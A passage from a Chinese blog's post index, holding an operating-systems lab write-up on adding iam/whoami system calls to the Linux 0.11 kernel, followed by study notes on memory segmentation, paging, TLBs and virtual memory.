的值对应上。\n同时还要仿照此文件中前面各个系统调用的写法，加上：\n1 2 extern int sys_whoami(); extern int sys_iam(); 不然，编译会出错的。\n4.3 实现 sys_iam() 和 sys_whoami() 添加系统调用的最后一步，是在内核中实现函数 sys_iam() 和 sys_whoami()。\n每个系统调用都有一个 sys_xxxxxx() 与之对应，它们都是我们学习和模仿的好对象。\n比如在 fs/open.c 中的 sys_close(int fd)：\n1 2 3 4 5 int sys_close(unsigned int fd) { // …… return (0); } 它没有什么特别的，都是实实在在地做 close() 该做的事情。\n所以只要自己创建一个文件：kernel/who.c，然后实现两个函数就万事大吉了。\n如果完全没有实现的思路，不必担心，本实验的 “6.7 在用户态和核心态之间传递数据” 还会有提示。\n4.4 修改 Makefile 要想让我们添加的 kernel/who.c 可以和其它 Linux 代码编译链接到一起，必须要修改 Makefile 文件。\nMakefile 里记录的是所有源程序文件的编译、链接规则，《注释》3.6 节有简略介绍。我们之所以简单地运行 make 就可以编译整个代码树，是因为 make 完全按照 Makefile 里的指示工作。\n如果想要深入学习 Makefile，可以选择实验楼的课程： 《Makefile 基础教程》、《跟我一起来玩转 Makefile》。\nMakefile 在代码树中有很多，分别负责不同模块的编译工作。我们要修改的是 kernel/Makefile。需要修改两处。\n（1）第一处 1 2 3 OBJS = sched.o system_call.o traps.o asm.o fork.o \\ panic.o printk.o vsprintf.o sys.o exit.o \\ signal.o mktime.o 改为：\n1 2 3 OBJS = sched.o system_call.o traps.o asm.o fork.o \\ panic.o printk.o vsprintf.o sys.o exit.o \\ signal.o mktime.o who.o 添加了 who.o。\n（2）第二处 1 2 3 4 5 6 ### Dependencies: exit.s exit.o: exit.c ../include/errno.h ../include/signal.h \\ ../include/sys/types.h ../include/sys/wait.h ../include/linux/sched.h \\ ../include/linux/head.h ../include/linux/fs.h ../include/linux/mm.h \\ ../include/linux/kernel.h ../include/linux/tty.h ../include/termios.h \\ ../include/asm/segment.h 改为：\n1 2 3 4 5 6 7 ### Dependencies: who.s who.o: who.c ../include/linux/kernel.h ../include/unistd.h exit.s exit.o: exit.c ../include/errno.h ../include/signal.h \\ ../include/sys/types.h ../include/sys/wait.h ../include/linux/sched.h \\ ../include/linux/head.h ../include/linux/fs.h ../include/linux/mm.h \\ ../include/linux/kernel.h ../include/linux/tty.h ../include/termios.h \\ ../include/asm/segment.h 添加了 who.s who.o: who.c ../include/linux/kernel.h ../include/unistd.h。\nMakefile 修改后，和往常一样 make all 就能自动把 who.c 加入到内核中了。\n如果编译时提示 who.c 有错误，就说明修改生效了。所以，有意或无意地制造一两个错误也不完全是坏事，至少能证明 Makefile 是对的。\n4.5 用 printk() 调试内核 oslab 实验环境提供了基于 C 语言和汇编语言的两种调试手段。除此之外，适当地向屏幕输出一些程序运行状态的信息，也是一种很高效、便捷的调试方法，有时甚至是唯一的方法，被称为“printf 法”。\n要知道到，printf() 是一个只能在用户模式下执行的函数，而系统调用是在内核模式中运行，所以 printf() 不可用，要用 printk()。\nprintk() 和 printf() 的接口和功能基本相同，只是代码上有一点点不同。printk() 需要特别处理一下 fs 寄存器，它是专用于用户模式的段寄存器。\n看一看 printk 的代码（在 kernel/printk.c 中）就知道了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int printk(const char *fmt, ...) { // …… __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; \u0026#34;pushl $buf\\n\\t\u0026#34; \u0026#34;pushl $0\\n\\t\u0026#34; \u0026#34;call tty_write\\n\\t\u0026#34; \u0026#34;addl $8,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (i):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); // …… } 显然，printk() 首先 push %fs 保存这个指向用户段的寄存器，在最后 pop %fs 将其恢复，printk() 的核心仍然是调用 tty_write()。查看 printf() 可以看到，它最终也要落实到这个函数上。\n4.6 编写测试程序 激动地运行一下由你亲手修改过的 “Linux 0.11 pro++”！然后编写一个简单的应用程序进行测试。\n比如在 sys_iam() 中向终端 printk() 一些信息，让应用程序调用 iam()，从结果可以看出系统调用是否被真的调用到了。\n可以直接在 Linux 0.11 环境下用 vi 编写（别忘了经常执行“sync”以确保内存缓冲区的数据写入磁盘），也可以在 Ubuntu 或 Windows 下编完后再传到 Linux 0.11 下。无论如何，最终都必须在 Linux 0.11 下编译。编译命令是：\n1 $ gcc -o iam iam.c -Wall gcc 的 “-Wall” 参数是给出所有的编译警告信息，“-o” 参数指定生成的执行文件名是 iam，用下面命令运行它：\n1 $ ./iam 如果如愿输出了你的信息，就说明你添加的系统调用生效了。否则，就还要继续调试，祝你好运！\n4.7 在用户态和核心态之间传递数据 指针参数传递的是应用程序所在地址空间的逻辑地址，在内核中如果直接访问这个地址，访问到的是内核空间中的数据，不会是用户空间的。所以这里还需要一点儿特殊工作，才能在内核中从用户空间得到数据。\n要实现的两个系统调用参数中都有字符串指针，非常像 open(char *filename, ……)，所以我们看一下 open() 系统调用是如何处理的。\n1 2 3 4 5 6 7 8 9 int open(const char * filename, int flag, ...) { // …… __asm__(\u0026#34;int $0x80\u0026#34; :\u0026#34;=a\u0026#34; (res) :\u0026#34;0\u0026#34; (__NR_open),\u0026#34;b\u0026#34; (filename),\u0026#34;c\u0026#34; (flag), \u0026#34;d\u0026#34; (va_arg(arg,int))); // …… } 可以看出，系统调用是用 eax、ebx、ecx、edx 寄存器来传递参数的。\n其中 eax 传递了系统调用号，而 ebx、ecx、edx 是用来传递函数的参数的 ebx 对应第一个参数，ecx 对应第二个参数，依此类推。 如 open 所传递的文件名指针是由 ebx 传递的，也即进入内核后，通过 ebx 取出文件名字符串。open 的 ebx 指向的数据在用户空间，而当前执行的是内核空间的代码，如何在用户态和核心态之间传递数据？\n接下来我们继续看看 open 的处理：\n1 2 3 4 5 6 7 8 9 10 11 system_call: //所有的系统调用都从system_call开始 ! …… pushl %edx pushl %ecx pushl %ebx # push %ebx,%ecx,%edx，这是传递给系统调用的参数 movl $0x10,%edx # 让ds,es指向GDT，指向核心地址空间 mov %dx,%ds mov %dx,%es movl $0x17,%edx # 让fs指向的是LDT，指向用户地址空间 mov %dx,%fs call sys_call_table(,%eax,4) # 即call sys_open 由上面的代码可以看出，获取用户地址空间（用户数据段）中的数据依靠的就是段寄存器 fs，下面该转到 sys_open 执行了，在 fs/open.c 文件中：\n1 2 3 4 5 6 7 8 9 10 11 12 int sys_open(const char * filename,int flag,int mode) //filename这些参数从哪里来？ /*是否记得上面的pushl %edx, pushl %ecx, pushl %ebx？ 实际上一个C语言函数调用另一个C语言函数时，编译时就是将要 传递的参数压入栈中（第一个参数最后压，…），然后call …， 所以汇编程序调用C函数时，需要自己编写这些参数压栈的代码…*/ { …… if ((i=open_namei(filename,flag,mode,\u0026amp;inode))\u0026lt;0) { …… } …… } 它将参数传给了 open_namei()。\n再沿着 open_namei() 继续查找，文件名先后又被传给dir_namei()、get_dir()。\n在 get_dir() 中可以看到：\n1 2 3 4 5 6 7 8 static struct m_inode * get_dir(const char * pathname) { …… if ((c=get_fs_byte(pathname))==\u0026#39;/\u0026#39;) { …… } …… } 处理方法就很显然了：用 get_fs_byte() 获得一个字节的用户空间中的数据。\n所以，在实现 iam() 时，调用 get_fs_byte() 即可。\n但如何实现 whoami() 呢？即如何实现从核心态拷贝数据到用心态内存空间中呢？\n猜一猜，是否有 put_fs_byte()？有！看一看 include/asm/segment.h ：\n1 2 3 4 5 6 7 8 9 10 extern inline unsigned char get_fs_byte(const char * addr) { unsigned register char _v; __asm__ (\u0026#34;movb %%fs:%1,%0\u0026#34;:\u0026#34;=r\u0026#34; (_v):\u0026#34;m\u0026#34; (*addr)); return _v; } extern inline void put_fs_byte(char val,char *addr) { __asm__ (\u0026#34;movb %0,%%fs:%1\u0026#34;::\u0026#34;r\u0026#34; (val),\u0026#34;m\u0026#34; (*addr)); } 他俩以及所有 put_fs_xxx() 和 get_fs_xxx() 都是用户空间和内核空间之间的桥梁，在后面的实验中还要经常用到。\n4.8 运行脚本程序 Linux 的一大特色是可以编写功能强大的 shell 脚本，提高工作效率。本实验的部分评分工作由脚本 testlab2.sh 完成。它的功能是测试 iam.c 和 whoami.c。\n首先将 iam.c 和 whoami.c 分别编译成 iam 和 whoami，然后将 testlab2.sh（在 /home/teacher 目录下） 拷贝到同一目录下。\n用下面命令为此脚本增加执行权限：\n1 $ chmod +x testlab2.sh 然后运行之：\n1 $ ./testlab2.sh 根据输出，可知 iam.c 和 whoami.c 的得分。\nerrno errno 是一种传统的错误代码返回机制。\n当一个函数调用出错时，通常会返回 -1 给调用者。但 -1 只能说明出错，不能说明错是什么。为解决此问题，全局变量 errno 登场了。错误值被存放到 errno 中，于是调用者就可以通过判断 errno 来决定如何应对错误了。\n各种系统对 errno 的值的含义都有标准定义。Linux 下用“man errno”可以看到这些定义。\n5. 实验步骤 1.添加宏定义 首先挂载文件系统，然后在此文件系统内进行编辑 挂载命令：sudo ./mount-hdc 首先找到unistd.h头文件，此文件在include子目录内\n打开它并在宏定义出追加 __NR_whoami 和 __NR_iam两个宏，追加后的效果如下\n2.添加用户空间接口函数 在挂载的文件系统内（在${OSLAB}/hdc/usr/root/目录下创建）任意位置新增以下两个文件\niam()函数文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; _syscall1(int,iam,const char*,name) int main(int argc,char* argv[]) { if(argc\u0026lt;=1) { printf(\u0026#34;NO Input!(\u0026gt;_\u0026lt;)(\u0026gt;_\u0026lt;)(\u0026gt;_\u0026lt;)\\n\u0026#34;); return -1; } else { if(iam(argv[1])\u0026lt;0) { printf(\u0026#34;.........Sys Call Exception!(\u0026gt;_\u0026lt;)\\n\u0026#34;); return -1; } } return 0; } whoami()函数文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define N 256 _syscall2(int,whoami,char*,name,unsigned int,size) int main() { int num; char temp[N]= {0}; num=whoami(temp,N); if(num \u0026gt;= 0) { printf(\u0026#34;%s\\n\u0026#34;,temp); } else { printf(\u0026#34;num \u0026lt;0 System Call Exception!(\u0026gt;_\u0026lt;)\u0026#34;); return -1; } return 0; } 新增完成后执行sudo umount hdc解除文件系统的挂载\n3.修改system_call.s文件 在路径/oslab/linux-0.11/kernel下\n修改系统调用总数\n4.修改sys.h文件 路径：/oslab/linux-0.11/include/linux\n在函数表内增加两个引用，位置需要一一对应。\n1 2 extern int sys_whoami(); extern int sys_iam(); 效果如下\nsys_call_table数组内加入sys_whoami和sys_iam，注意顺序一致\n5.创建who.c文件 每个系统调用都有一个 sys_xxxxxx() 与之对应，所以增加的两个函数调用也需要有这种函数与其对应\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;asm/segment.h\u0026gt; #include \u0026lt;errno.h\u0026gt; char mem[80]= {0}; int sys_iam(const char* name) { int i=0; int j=0; while(get_fs_byte(name+i)!=\u0026#39;\\0\u0026#39;) { i++; } if(i\u0026gt;=24) { return -EINVAL; } // else // { // printk(\u0026#34;strlen(%s) = %d\\n\u0026#34;,mem,i); // } while((mem[j]=get_fs_byte(name+j))!=\u0026#39;\\0\u0026#39;) { j++; } printk(\u0026#34;strlen(%s) = %d\\n\u0026#34;,mem,i); return j; } int sys_whoami(char* name,unsigned int size) { int i=0; int j=0; while (mem[i]!=\u0026#39;\\0\u0026#39;) { i++; } if (i\u0026gt;size) { return -1; } while(mem[j]!=\u0026#39;\\0\u0026#39;) { put_fs_byte(mem[j],(name+j)); j++; } return j; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include \u0026lt;asm/segment.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; char _myname[24]; int sys_iam(const char *name) { char str[25]; int i = 0; do { str[i] = get_fs_byte(name + i); } while (i \u0026lt;= 25 \u0026amp;\u0026amp; str[i++] != \u0026#39;\\0\u0026#39;); if (i \u0026gt; 24) { errno = EINVAL; i = -1; } else { strcpy(_myname, str); } return i; } int sys_whoami(char *name, unsigned int size) { int length = strlen(_myname); printk(\u0026#34;%s\\n\u0026#34;, _myname); if (size \u0026lt; length) { errno = EINVAL; length = -1; } else { int i = 0; for (i = 0; i \u0026lt; length; i++) { put_fs_byte(_myname[i], name + i); } } return length; } 将这个文件保存在kernel文件夹下\n6.修改Makefile文件 kernel/Makefile\n找到如下内容\n1 2 3 OBJS = sched.o system_call.o traps.o asm.o fork.o \\ panic.o printk.o vsprintf.o sys.o exit.o \\ signal.o mktime.o 并更改为\n1 2 3 OBJS = sched.o system_call.o traps.o asm.o fork.o \\ panic.o printk.o vsprintf.o sys.o exit.o \\ signal.o mktime.o who.o 找到如下内容\n1 2 3 4 5 6 ### Dependencies: exit.s exit.o: exit.c ../include/errno.h ../include/signal.h \\ ../include/sys/types.h ../include/sys/wait.h ../include/linux/sched.h \\ ../include/linux/head.h ../include/linux/fs.h ../include/linux/mm.h \\ ../include/linux/kernel.h ../include/linux/tty.h ../include/termios.h \\ ../include/asm/segment.h 并更改为\n1 2 3 4 5 6 7 ### Dependencies: who.s who.o: who.c ../include/linux/kernel.h ../include/unistd.h exit.s exit.o: exit.c ../include/errno.h ../include/signal.h \\ ../include/sys/types.h ../include/sys/wait.h ../include/linux/sched.h \\ ../include/linux/head.h ../include/linux/fs.h ../include/linux/mm.h \\ ../include/linux/kernel.h ../include/linux/tty.h ../include/termios.h \\ ../include/asm/segment.h 修改完成后执行make命令即可。\n7.运行更改后的系统 在oslab根目录内输入**./run**命令进行调试 然后进入iam.c和whoami.c的目录执行下列命令\n1 2 gcc iam.c -o iam gcc whoami.c -o whoami 遇到的问题 编译出错：\n问题出在头文件上面！！！\n==在 0.11 环境下编译 C 程序，包含的头文件都在 /usr/include 目录下。==\n该目录下的 unistd.h 是标准头文件（它和 0.11 源码树中的 unistd.h==并不是同一个文件==，虽然内容可能相同），没有 __NR_whoami 和 __NR_iam 两个宏，需要手工加上它们，也可以直接从修改过的 0.11 源码树中拷贝新的 unistd.h 过来。\n在内核中的代码包含的头文件是在/usr/include 下找的，但是我没有在该目录下的unistd.h修改，所以一直提示找不到头文件中定义的函数\n把linux-0.11/include/unistd.h拷贝到hdc/usr/include下\n再次编译，就没报错了（编译完后要sync） 不然编译后的文件关掉后再打开就不见了\n1 2 3 4 gcc iam.c -o iam gcc whoami.c -o whoami sync 结果：\n最后执行可执行文件iam和whoami进行测试 iam测试结果如下：\nwhoami测试结果如下:\n6. 实验报告 问题一 Linux-0.11的系统调用通过寄存器ebx、ecx、edx传递参数，最多能传递3个参数。 扩大传递参数的数量的方法：\n增加传参所用的寄存器； 利用自定义的结构体辅助参数的传递（c语言结构体）； 将寄存器拆分为高位和低位传递一直比较小的参数； 利用堆栈传递参数。 问题二 1.在include/unistd.h中定义宏__NR_foo，并添加供用户调用的函数声明void foo()；\n2.修改kernel/system_call.s中的nr_system_calls，增加新的系统调用；\n3.在include/linux/sys.h中添加函数声明extern void sys_foo()，在系统调用入口表fn_ptr末端添加元素sys_foo；\n4.添加kernel/foo.c文件，实现sys_foo()函数；\n5.修改kernel/Makefile，在OBJS中加入foo.o，并添加生成foo.s、foo.o的依赖规则；\n6.重新执行make命令，并进入挂载的文件系统内进行编译测试。\n","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C3-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/","summary":"1. 实验目的 建立对系统调用接口的深入认识； 掌握系统调用的基本过程； 能完成系统调用的全面控制； 为后续实验做准备。 2. 实验内容 此次实验的基本内容是：","title":"实验3 系统调用"},{"content":"内存使用与分段 一、内存使用 1.逻辑地址 内存作为计算机的基本组成部分，用来存储程序（指令和数据），内存单元按字节编址、寻址，程序装入到内存后，PC 指向程序开始地址，依次取指执行\n==即内存使用：将程序放到内存中，PC指向开始地址==\n这是main()编译后，entry是入口地址，如果_main相对于_entry的偏移地址是40\n现在如果这段程序要运行，那么只要将PC指向 call 40 这条指令所在的地址就好了，执行完call 40之后，会自动跳到地址为40处执行。\n但是现在有个问题，_main所在的位置一定是物理地址为40的位置吗？换言之，40表示的是物理地址吗？\n学过前面的知识，我们知道肯定不是的，前面放的system模块\ncall 40这个40指的是相对于_entry的偏移量，程序里面的地址是==相对地址（逻辑地址）==，而==程序真正运行时的地址是绝对地址（物理地址）==，即程序运行时，==根据逻辑地址得到物理地址就是地址的重定位==。\n比如_entry这条指令的地址如果存放在物理地址为1000处，那么_main的 地址就应该是1040，所以call 40就要变成call 1040.\n2.重定位 ==重定位:== ==重定位是指将指令中的逻辑地址转换为内存中实际的物理地址的过程==\n重定位方式:\n1.编译时重定位 编译时重定位的程序只能放在内存中的固定位置，而编译结束后的内存使用情况不一定,与编译时的相同，因此这种重定位方式有很大的局限性。必须保证装入该程序时，这段程序要使用的地址是可用的。\n编译时进行重定位后，装入过程不需要有额外开销，因此效率较高\n编译时重定位一般用在可以保证一段程序固定地装入某段内存中的嵌入式系统中\n2.载入时重定位（静态重定位） 程序在装入内存时，将指令中的相对地址加上装入的内存段的基址作为绝对地址，载入时重定位的程序一旦载入内存后就不可以再移动位置。不利于程序在内存中的移动（交换，swap）。\n3.运行时重定位（动态重定位）(最佳时机） 运行时重定位的程序，装入内存的仍是逻辑地址，在实际访问时进行重定位，即在进程 PCB 中保存程序段的基址，实际访问时进行地址翻译（由基地址与逻辑偏移计算出物理地址），无妨交换\n3.交换 为了更好地支持多进程，当内存空闲空间不足时，有选择地将某些进程保存到硬盘上（换出），将腾出的空间交给当前需要运行的进程使用，即将要运行的进程换入到内存\n进程1睡眠将进程1换出放入磁盘中，并将要运行的程序换入，当程序1要再次运行的时候，就再次换入，但是每次的基地址可能不一样。所以，一般在运行时重定位。\n二、内存分段 在内存的使用方式，以及每个进程中的指令的地址如何对应到实际的内存 实际上，更多时候进程不是作为一个连续的整体装入内存的\n而按照程序本身特点，将进程分段管理，满足每个段的需要，建立段表，描述段的信息，包括段号、段基址、段限长，段类别等等 可以单独移动、扩大某个段，只需要维护好段表\n进程由多个部分(段)组成，每个段有各自的特点和用途，因为各个段性质的不同，当所有段作为一个整体看待时就会有所不便，比如，代码段是只读的，代码段、数据段不会动态增长，而堆栈段可能要动态增长 假如不分段，在一个程序中执行指令和数据会杂糅在一起并保存在内存中，由于执行指令写到内存后不能被用户修改的，属于只读属性的。而程序中的数据是可读可写的，所以当计算机取址执行时还要判断该对应内存地址下的是指令还是数据，这样就不好判断了。所以我们将指令与数据用地址区间来分开，这样计算机在取址时通过判断地址就可以知道取的是指令还是数据，便于执行程序。所以人们为了计算机方便，就将程序中的具有相同属性的内容放到同一块内存片段。\n定位指令(数据):\u0026lt;段号，段内偏移\u0026gt;\n重定位的段号有特定的表来记录(LDT，和GDT表一样) CPU每执行一条牵涉到地址的指令都会查一下PCB里面这个进程段表，从而确定物理地址，有一个专门存放该表地址的寄存器LDTR寄存器。\n每个进程可以维护一个LDT表作为进程段表 操作系统维护 GDT，每个 LDT 的入口可以作为GDT的一个表项，LDTR寄存器保存当前LDT的地址 进程切换时，切换PCB，包括切换指令序列(CS:IP)与映射表(LDT)\n当内存在分段管理时，建立一个进程需要按程序所分的段(编译时确定)建立其段表，即初始化LDT，并将LDT与PCB关联起来，然后在内存中找到一块合适空闲区域装入程序\n1.linux0.11下TCB/PCB的实现都是靠一个task_struct结构体\n2.这个结构体里面还有一个结构体tss\n3.tss里面放的内容可以理解为是当前进程的CPU快照\n4.由于进程切换，段寄存器的内容就放在task_struct里的tss了\n内存的管理 前面讲了内存的分段，这才是内存管理的起点。接下来，分段和分页结合使用才能真正的管理和使用内存\n一、内存分区 分区式存储管理是把内存分为一些大小相等或不等的分区，操作系统占用其中一个分区，其余的分区由应用程序使用，每个应用程序占用一个或几个分区。分区式存储管理虽然可以支持并发，但难以进行内存分区的共享。\n专业术语介绍\n(1)内碎片与外碎片：\n内碎片是占用分区内未被利用的空间，外碎片是占用分区之间难以利用的空闲分区(通常是小空闲分区)。\n(2)内存紧缩：将空间分区合并需要移动一个段（复制内容），消耗大量时间，影响操作系统性能\n1.固定分区 固定分区：把内存划分为若干个固定大小的连续分区，这种作法只适合于多个相同程序的并发执行(处理多个类型相同的对象)。分区大小也可以不等：有多个小分区、适量的中等分区以及少量的大分区。根据程序的大小，分配当前空闲的、适当大小的分区。 优点：易于实现，开销小 缺点：内碎片造成浪费；分区总数固定，限制了并发执行的程序数目\n2.动态分区 ==动态分区就是动态创建分区，在装入程序时按其初始要求分配，或在其执行过程中通过系统调用进行分配或改变分区大小。==\n动态分区的分区分配就是寻找某个空闲分区，其大小需大于或等于程序的要求。若是大于需求，则将该分区分割成两个分区，其中一个分区为要求的大小并标记为“占用”，而另一个分区为余下部分并标记为“空闲”。\n分区分配的先后次序通常是从内存低端到高端。动态分区的分区释放过程中有一个要注意的问题是，将相邻的空闲分区合并成一个大的空闲分区。 与固定分区相比较：没有内碎片，但它却引入了另一种碎片——外碎片。\n==(1)可变分区的管理过程——核心数据结构==\n通过已分配分区表和空闲分区表两张表来记录分区使用情况。当有段请求时，空闲分区表将改变 ==(2)可变分区的管理—请求分配== 在上图中，原本内存中已分配了seg1和seg2，空闲分区从地址250k开始，大小为250K，现有一个100k大小的段请求，于是250k-350k被分配给了新请求段seg3，空闲分区还剩下150k\n==(3)可变分区的管理—释放内存== 同时由于进程可能被换入换出，所以内存中已分配的空间有可能被释放，因此空闲分区可能存在多段\n==(4)可变分区的管理—再次申请==\n当存在多个空间分区时，再来一个段提出内存请求，该选谁？所以引入了三个分区分配算法\n3.分区分配算法 ==(1)最先适配法(nrst-fit)==\n按分区在内存的先后次序从头查找，找到符合要求的第一个分区进行分配。该算法的分配和释放的时间性能较好，较大的空闲分区可以被保留在内存高端。但随着低端分区不断划分会产生较多小分区，每次分配时查找时间开销便会增大。\n==(2)最佳适配法(best-fit)==\n按分区在内存的先后次序从头查找，**找到其大小与要求相差最小的空闲分区进行分配。**从个别来看，外碎片较小；但从整体来看，会形成较多外碎片优点是较大的空闲分区可以被保留。\n==(3)最坏适配法(worst- fit)==\n按分区在内存的先后次序从头查找，找到最大的空闲分区进行分配。基本不留下小空闲分区，不易形成外碎片。但由于较大的空闲分区不被保留，当对内存需求较大的进程需要运行时，其要求不易被满足。\n首先适配快，但其他分区就浪费时间，最佳分配需要遍历内存 因此需要引入分页：解决内存分区导致的内存效率问题\n二、内存分页 1.引入分页 引入分页: 解决内存分区导致的内存效率问题\n可变分区多次分配以后就会形成内存碎片，当再来一个段请求大于每个单个空间空间时，就需要将内存合并：内存紧缩，内存紧缩需要花费大量时间 解决方法：将每个段分成多页，内存也分成很多页，页是最小分配单位，这样每次分配段空间，最多浪费不超过一页，没有内存碎片\n其实也有会部分内存没有使用到，但是注意这种思想，页是一个单位，每次分配的内存都是整数个页，也就是将这些分配出去的页都看成是已经使用的了，所以就没有内存碎片。==所以从内存角度来说这种方式是比较好的，也就是物理内存想要分页，但是用户程序希望是分段。==后面会说到的\n每个段在计算物理地址时需要查找段的基址，那么将段分成页后，计算物理地址需要查找页的基址，物理地址=页基址+逻辑地址。\nPCB中存在页表保存每个段的页分配信息，为了取分段的页，将内存的页叫作页框 内存分段的有一个段表，分页自然也要有一个页表。有一个专门的寄存器存储页表的地址。\n注意页在内存的排布顺序并不是按照地址的顺序递增的，也就是说页0不一定是放在地址零处，这里引入页框，页框是按照内存顺序排列的，并且页框的大小和页是相同的\n分析mov [0x2240],%eax\n1 2 3 4 5 图片中： mov [0x2240],%eax 2240地址表示的实际内存地址是多少？首先看它是那一页的，每一页的大小为 4k，0x2240除以4K得到页号，除以4K也就是右移12位,得到2,即第二页，根据页 号找到具体的页框号，在上图中为3，具体的地址就是3*4K+240=3240，即物理地 址为3240. 2.多级页表 为了提高内存的利用率，内存是分页管理的，并且有一个页表用来存储页号与页框的对应关系。 但是，为了更好的提高内存的利用率，每一页就应该做得足够小，但是每一页都要在页表里面有一项与页框对应，也就是说页数越多页表也就会越大，页表如果很大的话就会对内存造成浪费，因为存放页表的这部分你内存是不能给程序使用的，并且一直存放在该进程的PCB里面\n(1)只存放用到的页\n只用到0，1，3就存放这三页，如图 若这存放用到的页，但这样的话页表的项就不连续了，找某一页对应的页框就不能直接使用偏移量的形式，较高查找效率是折半查找（因为页号是有顺序的），即便使用折半查找耗费的时间也会比使用偏移量大很多倍。\n所以页表的页号必须是连续的。\n==(2)多级页表(页目录表+页表)==\n==页目录表的每一项对应一个页表，然后再根据页表找到对应的页。== 一个逻辑地址用10bits的页目录号+10bits的页号+12bits的偏移组成 这种思想就类似于书本的目录，目录的地方有一个章目录（页目录表）和节目录（页表)，如果要查找某一节的内容首先找到这一章的地方，然后再查具体的某一节\n不仅能节省大量内存，并且保证了章目录和节目录都是连续的，所以可以使用偏移量的形式查找对应的章节\n3.快表TLB 多级页表提高了空间效率，但是在时间的效率上非常低。因为每一次访问的时候都要根据章目录找到页目录再找到具体的页。也就是需要访问三次内存，cpu每一条指令执行的时间其实大部分都是浪费在访问内存上 解决方法：在CPU与内存访问之间加一组TLB，==TLB是一组寄存器，用来存放最近使用过的页对应的页框号==\n这样如果CPU需要访问某一页首先在TLB里面找，如果TLB里面有就不用访问内存了，因为TLB是寄存器，cpu访问寄存器的速度远大于对内存的访问速度，大大地提升时间性能了。\n提升时间性能最主要的因素就是==可以在TLB里面直接找到该页对应的页框号==。\n要提升命中率，TLB肯定是越大越好，但是TLB材料很贵，不会做得很大。TLB的大小大概是[64,1024]。\n为什么TLB里面存放这么少的项就能实现“近似访存1次”？\n因为程序的局部性原理，==程序的局部性原理在用户程序里面多对应的是循环，顺序结构==\n总结 为了提高内存的空间性能，提出了多级页表；但是提到空间性能是以浪费时间性能为基础的，因此为了补充损失的时间性能，提出了快表(即TLB)，快表利用的是程序的局部性原理。\nLinux虚拟内存 一、虚拟内存的引入 1.基本概念 虚拟内存：\n用辅助存储器（一般指磁盘）作为内存的补充。虚拟内存允许进程执行时只将部分程序放入内存，因此程序可以比物理内存大。虚拟内存的大小受计算机寻址机制和可用辅助存储器容量大限制，而不受内存容量的限制。\n特征：\n①运行进程时只把现在要执行的页/段装入内存，其余页/段放在外存，需要时再利用请求调入页/段功能和置换功能将其调入内存。 ②在逻辑上扩充内存容量 ③访问速度接近于内存，没位(bit)成本接近于外存。\n虚拟地址：即逻辑地址，虚拟内存中某个字节的地址，假设该字节在内存中（其实可能位于磁盘，但这对用户是透明的）\n虚拟地址空间：分配给某个进程（程序）的虚拟地址范围\n实地址：即物理地址, 物理内存中某个字节的地址\n驻留集：进程运行时装入内存的部分\n工作集：在 t 时刻，进程在过去的N个时间单位内访问的页面集合(活跃页面)\n内存管理单元MMU：集成在CPU中，或作为一个协处理器\n==功能：分解逻辑地址；逻辑地址到物理地址的转换；查找更新快表TLB；进程切换时清空TLB；发出缺页中断或越界中断；设置和检查页表中各个特征位。==\n2.局部性原理 上一篇笔记中提了一点关于局部性原理的特点，这里更详细的介绍。\n局部性原理表现在以下两个方面：\n==(1)时间局部性==\n如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。\n原因:==是由于在程序中存在着大量的循环操作==\n==(2)空间局部性==\n一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内\n原因：==指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的==。\n快表、 页高速缓存以及虚拟内存技术从广义上讲，都是属于高速缓存技术。这个技术所依赖的原理就是局部性原理。局部性原理既适用于程序结构，也适用于数据结构\n3.引入 从前面我们了解到：物理内存必须得是分页管理的；对用户来说是分段的。\n但是用户程序最终能在内存上面跑，肯定需要某种机制或者转化使得以用户程序的视角看起来内存是分段的，以物理内存的视角看起来又是分页的，这种机制就是虚拟内存\n时间局部性是通过将近来使用的指令和数据保存到高速缓存存储器中，并使用高速缓存的层次结构实现。\n空间局部性通常是使用较大的高速缓存，并将预取机制集成到高速缓存控制逻辑中实现。虚拟内存技术实际上就是建立了 